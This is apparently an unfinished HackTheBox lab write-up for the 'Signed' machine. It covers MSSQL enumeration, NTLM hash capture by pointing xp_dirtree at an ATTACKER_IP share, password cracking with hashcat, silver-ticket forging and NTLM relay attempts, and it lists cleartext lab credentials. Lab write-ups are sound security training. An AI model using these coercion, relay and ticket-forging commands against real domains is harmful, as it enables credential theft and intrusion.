# HackTheBox: Signed - Penetration Test Writeup

## Target Information
- **IP Address**: 10.10.11.90
- **Initial Credentials**: scott / Sm230#C5NatH (MSSQL)
- **Date**: 2026-01-04
- **Difficulty**: Hard (based on attack surface and required techniques)

---

## Executive Summary

The "Signed" box presents a challenging scenario with only MSSQL (port 1433) exposed. Initial credentials provide limited guest-level access. Through NTLM coercion, the domain service account `mssqlsvc` hash was captured and cracked. The intended attack path likely involves NTLM relay to escalate privileges within SQL Server or the domain.

---

## Phase 1: Reconnaissance

### Port Scanning
```bash
nmap -sC -sV -p- --min-rate=1000 -oA enum/nmap_initial 10.10.11.90
```

**Results:**
| Port | Service | Version |
|------|---------|---------|
| 1433 | MSSQL | Microsoft SQL Server 2022 RTM (16.00.1000.00) |

**Target Details:**
- Domain: SIGNED.HTB
- Computer Name: DC01.SIGNED.HTB (Domain Controller!)
- OS: Windows Server 2019 (Build 17763)

### Host Configuration
```bash
echo "10.10.11.90 signed.htb dc01.signed.htb DC01" | sudo tee -a /etc/hosts
```

---

## Phase 2: MSSQL Enumeration

### Initial Connection (SQL Authentication)
```bash
impacket-mssqlclient 'scott:Sm230#C5NatH@10.10.11.90'
```

**Key Findings:**
- Login: `scott` (SQL Login)
- Database Context: `guest` (very limited privileges)
- IS_SRVROLEMEMBER('sysadmin'): **0** (not admin)
- xp_cmdshell: **DENIED**
- Databases: master, tempdb, model, msdb (defaults only)

### NTLM Hash Capture via xp_dirtree

The `xp_dirtree` extended stored procedure can access UNC paths, triggering NTLM authentication:

**Attack Setup:**
```bash
# Terminal 1: Start SMB listener
sudo impacket-smbserver -smb2support share /tmp

# Terminal 2: Trigger coercion
impacket-mssqlclient 'scott:Sm230#C5NatH@10.10.11.90'
```

```sql
EXEC xp_dirtree '\\ATTACKER_IP\share', 1, 1;
```

**Captured NTLMv2 Hash:**
```
mssqlsvc::SIGNED:53a61f7e888880ab:8460FA1507FA0218C747F87AA0343799:0101000000000000...
```

### Hash Cracking
```bash
hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt --force
```

**Cracked Password:** `mssqlsvc : purPLE9795!@`

---

## Phase 3: Domain Account Enumeration

### Windows Authentication with mssqlsvc
```bash
impacket-mssqlclient 'SIGNED/mssqlsvc:purPLE9795!@@10.10.11.90' -windows-auth
```

**Findings:**
- Still mapped to `guest` database context
- IS_SRVROLEMEMBER('sysadmin'): **0**
- xp_cmdshell: Still **DENIED**

### Domain Information Extracted

**Domain SID:**
```
S-1-5-21-4088429403-1159899800-2753317549
```

**SQL Server Logins:**
| Login | Type | Notes |
|-------|------|-------|
| sa | SQL_LOGIN | Disabled by default |
| scott | SQL_LOGIN | Guest privileges |
| SIGNED\IT | WINDOWS_GROUP | CONNECT SQL |
| SIGNED\Domain Users | WINDOWS_GROUP | CONNECT SQL, VIEW ANY DEFINITION |
| ##MS_PolicySigningCertificate## | CERTIFICATE_MAPPED | **CONTROL SERVER** (sysadmin!) |

### Important Discovery
The certificate-mapped login `##MS_PolicySigningCertificate##` has **CONTROL SERVER** permission, which is equivalent to sysadmin. This aligns with the box name "Signed".

### File System Enumeration
```sql
-- User flag location
EXEC xp_dirtree 'C:\Users\mssqlsvc\Desktop', 1, 1;
-- Returns: user.txt (confirmed!)
```

**File Reading Attempts - All Failed:**
- OPENROWSET BULK: Permission denied (no bulkadmin role)
- xp_cmdshell: Permission denied
- xp_regread: Access denied
- OLE Automation: Not configured
- CLR: Disabled

---

## Phase 4: Attack Vectors Attempted

### 1. Silver Ticket Attack

**Attempt:**
```bash
# Calculate NTLM hash from password
python3 -c "import hashlib; print(hashlib.new('md4', 'purPLE9795!@'.encode('utf-16-le')).hexdigest())"
# Result: 86f422d56cb5b4b557d537ff4a80834a

# Create Silver Ticket
impacket-ticketer -nthash 86f422d56cb5b4b557d537ff4a80834a \
    -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
    -domain SIGNED.HTB \
    -spn MSSQLSvc/DC01.SIGNED.HTB:1433 \
    -user-id 500 \
    Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k DC01.SIGNED.HTB
```

**Result:** Failed - "Login is from an untrusted domain"

**Analysis:** The mssqlsvc account is not the actual service account for MSSQL. SQL Server runs as `NT SERVICE\MSSQLSERVER` (virtual service account), which uses the computer account's Kerberos identity. We would need DC01$'s hash for a valid Silver Ticket.

### 2. NTLM Relay Attacks

**Working Relay Setup (Requires pseudo-terminal via `script`):**
```bash
# The relay process exits immediately when backgrounded
# Use 'script' to maintain pseudo-terminal
script -q -c "timeout 60 sudo impacket-ntlmrelayx -t TARGET -smb2support --no-http-server -debug" /dev/null 2>&1
```

**Attempt (MSSQL):**
```bash
script -q -c "timeout 60 sudo impacket-ntlmrelayx -t mssql://10.10.11.90 -smb2support --no-http-server -debug" /dev/null 2>&1
```
**Result:** Connection received but relay fails:
```
[*] SMBD-Thread-4 (process_request_thread): Received connection from 10.10.11.90, attacking target mssql://10.10.11.90
[-] ERROR(DC01): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
[-] Authenticating against mssql://10.10.11.90 as SIGNED/MSSQLSVC FAILED
```

**Attempt (LDAP/LDAPS):**
```bash
script -q -c "timeout 60 sudo impacket-ntlmrelayx -t ldaps://10.10.11.90 --shadow-credentials -smb2support --no-http-server -debug" /dev/null 2>&1
```
**Result:** Connection received but relay fails silently:
```
[*] SMBD-Thread-4 (process_request_thread): Received connection from 10.10.11.90, attacking target ldaps://10.10.11.90
```
No success or error message after this - likely LDAP signing/channel binding enforced.

**Attempt (SMB):**
```bash
script -q -c "timeout 60 sudo impacket-ntlmrelayx -t smb://10.10.11.90 -smb2support --no-http-server -debug" /dev/null 2>&1
```
**Result:** Connection received but SMB signing likely required (Domain Controller).

**Relay Conclusions:**
- MSSQL relay blocked by "untrusted domain" error - possibly EPA/Channel Binding enforced
- LDAP/LDAPS relay fails silently - LDAP signing likely required
- SMB relay fails - SMB signing required on Domain Controller
- Direct LDAP/LDAPS connections timeout (not exposed externally)

### 3. SQL Server Certificate Investigation

**Enumerated Certificates:**
```sql
SELECT name, certificate_id, pvt_key_encryption_type_desc, thumbprint FROM sys.certificates;
```

| Certificate Name | ID | Private Key | Thumbprint |
|-----------------|-----|-------------|------------|
| ##MS_SQLResourceSigningCertificate## | 101 | NO_PRIVATE_KEY | 67bc58c8... |
| ##MS_SQLReplicationSigningCertificate## | 102 | NO_PRIVATE_KEY | 164f4777... |
| ##MS_SQLAuthenticatorCertificate## | 103 | NO_PRIVATE_KEY | a3641c72... |
| ##MS_AgentSigningCertificate## | 104 | NO_PRIVATE_KEY | fb1b6ce6... |
| **##MS_PolicySigningCertificate##** | 105 | NO_PRIVATE_KEY | 7bd6fa74... |
| ##MS_SmoExtendedSigningCertificate## | 106 | NO_PRIVATE_KEY | a37fda7b... |

**Key Finding:** All system certificates have NO_PRIVATE_KEY stored in the database. The private keys may be stored in the Windows certificate store or were never exported.

**Checked for signed procedures:**
```sql
SELECT OBJECT_NAME(cp.major_id), c.name FROM sys.crypt_properties cp
JOIN sys.certificates c ON cp.thumbprint = c.thumbprint;
```
**Result:** No signed procedures found.

**Permission Checks:**
```sql
SELECT HAS_PERMS_BY_NAME('master', 'DATABASE', 'CREATE CERTIFICATE') -- 0
SELECT HAS_PERMS_BY_NAME('master', 'DATABASE', 'CREATE PROCEDURE')   -- 0
SELECT HAS_PERMS_BY_NAME('master', 'DATABASE', 'CREATE ASSEMBLY')    -- 0
```
**Result:** No CREATE permissions - cannot create our own signed modules.

### 4. Registry Access
```sql
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'DefaultPassword';
```
**Result:** Access denied

---

## Current Attack Status

### Credentials Obtained
| Account | Password | Access Level |
|---------|----------|--------------|
| scott | Sm230#C5NatH | SQL Guest |
| SIGNED\mssqlsvc | purPLE9795!@ | Domain User, SQL Guest |

### Key Observations
1. **Single Port Exposure**: Only MSSQL (1433) accessible - limits attack surface
2. **Certificate Signing**: Box name and `##MS_PolicySigningCertificate##` with CONTROL SERVER suggest certificate-based escalation
3. **File Visibility**: Can enumerate files but cannot read them
4. **NTLM Coercion**: Working - always authenticates as mssqlsvc
5. **Relay Challenges**: NTLM relay to MSSQL or LDAP not completing

### Files of Interest
- `C:\Users\mssqlsvc\Desktop\user.txt` - User flag (visible but unreadable)
- `C:\Users\Administrator\Desktop\` - Empty or inaccessible

---

## Likely Attack Path (To Investigate)

Based on the box name "Signed" and the presence of certificate-mapped logins with elevated privileges:

1. **NTLM Relay to MSSQL**: Relay mssqlsvc's credentials back to MSSQL to potentially gain sysadmin access
2. **ADCS Abuse**: Check for Active Directory Certificate Services vulnerabilities (ESC1-ESC11)
3. **Module Signing Abuse**: Exploit SQL Server's module signing mechanism if possible
4. **Shadow Credentials**: Add shadow credentials to mssqlsvc or another account via LDAP relay

---

## Commands Reference

### MSSQL Connection
```bash
# SQL Auth
impacket-mssqlclient 'scott:Sm230#C5NatH@10.10.11.90'

# Windows Auth
impacket-mssqlclient 'SIGNED/mssqlsvc:purPLE9795!@@10.10.11.90' -windows-auth
```

### NTLM Coercion
```sql
EXEC xp_dirtree '\\ATTACKER_IP\share', 1, 1;
```

### Hash Cracking
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Lessons Learned

1. **Limited SQL Access**: Guest-level SQL access severely limits attack options
2. **NTLM Coercion**: Always test xp_dirtree for hash capture even with limited permissions
3. **Box Names as Hints**: "Signed" strongly suggests certificate/signing attacks
4. **Virtual Service Accounts**: Modern SQL Server uses NT SERVICE accounts, complicating Silver Ticket attacks

---

## Tools Used
- nmap
- impacket-mssqlclient
- impacket-smbserver
- impacket-ntlmrelayx
- impacket-ticketer
- hashcat

---

---

## Next Steps to Investigate

1. **ADCS ESC8 (Web Enrollment Relay)**: If ADCS has web enrollment enabled internally, relay to http://DC01.signed.htb/certsrv
2. **Coercion via Different Methods**: Try PetitPotam, PrinterBug, or other coercion techniques if SQL Server uses a different service account
3. **Certificate Export**: Check if certificate backups exist on filesystem via xp_dirtree
4. **IT Group Investigation**: The SIGNED\IT Windows group has CONNECT SQL permission - may have other privileges
5. **Machine Account Compromise**: If we can obtain DC01$ hash, Silver Ticket to MSSQL would work

---

*Status: Investigation in progress - NTLM relay receives connections but authentication fails. Certificate-based attack path needs further investigation based on box name "Signed" hint.*
